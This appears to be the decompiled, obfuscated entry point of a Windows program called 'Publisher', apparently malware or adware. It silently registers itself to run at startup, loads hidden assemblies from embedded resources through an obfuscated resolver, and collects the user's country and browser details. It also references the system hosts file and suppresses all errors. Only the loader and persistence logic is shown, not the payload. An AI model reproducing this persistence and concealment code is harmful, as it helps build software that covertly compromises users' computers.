using System;
using System.IO;
using System.Reflection;
using Publisher.Utility;

namespace Publisher;

internal static class Program
{
	private static string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers\\etc\\hosts");

	[STAThread]
	public static void Main(string[] args)
	{
		try
		{
			CommonUtility.SetAllowUnsafeHeaderParsing20();
			LoadDllRessource();
			Init();
			string text = Assembly.GetEntryAssembly()!.Location + " " + string.Join(" ", args);
			SystemUtility.addToStarup(AppDomain.CurrentDomain.FriendlyName, text);
			Protect.Doprotection();
			Publisher.OnlineWork();
		}
		catch (Exception)
		{
		}
	}

	private static void LoadDllRessource()
	{
		CtESRaddkx6E5EaS4L(Pvel8AYsk2Si0xGPRr(), (ResolveEventHandler)delegate(object sender, ResolveEventArgs bargs)
		{
			int num = 7;
			if (_003C_003Ec.T6tiEpZ2WNx7g57qshR())
			{
				goto IL_006e;
			}
			goto IL_00e7;
			IL_00e7:
			string text = default(string);
			string object_ = default(string);
			string[] array2 = default(string[]);
			string[] array = default(string[]);
			int num2 = default(int);
			bool flag = default(bool);
			Assembly assembly = default(Assembly);
			string text2 = default(string);
			while (true)
			{
				switch (num)
				{
				case 18:
					text = (string)((object[])_003C_003Ec.q4oajTZ8MGb79OKWLrV(text, new char[1] { ',' }))[0];
					goto case 6;
				case 6:
					object_ = (string)_003C_003Ec.d48sEsZpUPclQcaC0Z2(_003C_003Ec.OW82EWZP2uVIxb4EHAf(new AssemblyName(text)), ".dll");
					num = 3;
					if (_003C_003Ec.Vk3ViYZTWYjP7iYuq82())
					{
						continue;
					}
					break;
				case 2:
				case 11:
					break;
				case 17:
					goto IL_0056;
				case 15:
					goto IL_005a;
				default:
					goto IL_006e;
				case 13:
					array2 = array;
					_ = 0;
					if (!_003C_003Ec.Vk3ViYZTWYjP7iYuq82())
					{
						num = 2;
						if (_003C_003Ec.T6tiEpZ2WNx7g57qshR())
						{
						}
						continue;
					}
					goto case 1;
				case 1:
				case 9:
					num2 = 0;
					goto IL_006e;
				case 12:
					flag = _003C_003Ec.GtIHGTZkbIxZyZhCKFD(_003C_003Ec.IIxSm1ZOUeZ5SMmDtML(bargs), ",");
					goto case 4;
				case 4:
					if (flag)
					{
						goto case 18;
					}
					goto case 6;
				case 10:
					array = (string[])_003C_003Ec.Aw12NPZ6My4Ipeqq8As(assembly);
					goto case 5;
				case 5:
					text2 = null;
					goto case 13;
				case 7:
					text = (string)_003C_003Ec.IIxSm1ZOUeZ5SMmDtML(bargs);
					goto case 12;
				case 3:
					assembly = (Assembly)_003C_003Ec.sAh79DZRqBbWocCoqZX();
					num = 10;
					if (_003C_003Ec.Vk3ViYZTWYjP7iYuq82())
					{
						continue;
					}
					goto IL_014f;
				case 19:
					goto IL_0148;
				case 0:
					goto IL_014f;
				case 14:
					goto IL_0153;
				case 20:
					goto IL_0162;
				}
				break;
			}
			goto IL_004c;
			IL_0153:
			return null;
			IL_0162:
			Stream manifestResourceStream = default(Stream);
			try
			{
				byte[] array3 = new byte[_003C_003Ec.BwZp2pZC6ngc3gOm1S1(manifestResourceStream)];
				_003C_003Ec.T6tiEpZ2WNx7g57qshR();
				if (_003C_003Ec.Vk3ViYZTWYjP7iYuq82())
				{
					manifestResourceStream.Read(array3, 0, array3.Length);
				}
				return (Assembly)_003C_003Ec.m6EhfMZFWtknqDSHJpJ(array3);
			}
			finally
			{
				((IDisposable)manifestResourceStream)?.Dispose();
			}
			IL_0148:
			bool flag2 = text2 == null;
			goto IL_014f;
			IL_014f:
			if (flag2)
			{
				goto IL_0153;
			}
			manifestResourceStream = assembly.GetManifestResourceStream(text2);
			goto IL_0162;
			IL_0056:
			string text3 = default(string);
			text2 = text3;
			goto IL_005a;
			IL_004c:
			if (_003C_003Ec.GtIHGTZkbIxZyZhCKFD(text3, object_))
			{
				goto IL_0056;
			}
			goto IL_005a;
			IL_005a:
			num2++;
			num = 8;
			if (_003C_003Ec.T6tiEpZ2WNx7g57qshR())
			{
			}
			goto IL_00e7;
			IL_006e:
			if (num2 < array2.Length)
			{
				text3 = array2[num2];
				goto IL_004c;
			}
			goto IL_0148;
		});
	}

	private static void Init()
	{
		CommonConfig.BrowserInstalledLocation = InformationsUtility.GetInstalledBrowser();
		_ = 0;
		if (iGM7pnjGXSnZp1ZE9Z())
		{
			O8UCe4wG7CK9Ze54vw(CommonUtility.GetCountryByIP());
		}
		ysx9plTI3UqHXOofjy(ghowYHVc7CRXgqVkXK());
	}

	internal static bool iGM7pnjGXSnZp1ZE9Z()
	{
		return true;
	}

	internal static bool B7wnrxLh1LaNcdXxhg()
	{
		return false;
	}

	internal static object Pvel8AYsk2Si0xGPRr()
	{
		return AppDomain.CurrentDomain;
	}

	internal static void CtESRaddkx6E5EaS4L(object object_0, object object_1)
	{
		((AppDomain)object_0).AssemblyResolve += (ResolveEventHandler?)object_1;
	}

	internal static void O8UCe4wG7CK9Ze54vw(object object_0)
	{
		CommonConfig.Country = (string)object_0;
	}

	internal static object ghowYHVc7CRXgqVkXK()
	{
		return InformationsUtility.defaultBrowser();
	}

	internal static void ysx9plTI3UqHXOofjy(object object_0)
	{
		CommonConfig.DefaultBrows = (string)object_0;
	}

	internal static object HB7xPc2OLSUJhUtG68(Environment.SpecialFolder specialFolder_0)
	{
		return Environment.GetFolderPath(specialFolder_0);
	}

	internal static object ykwesi3uZZjgxf0ENr(object object_0, object object_1)
	{
		return Path.Combine((string)object_0, (string)object_1);
	}
}
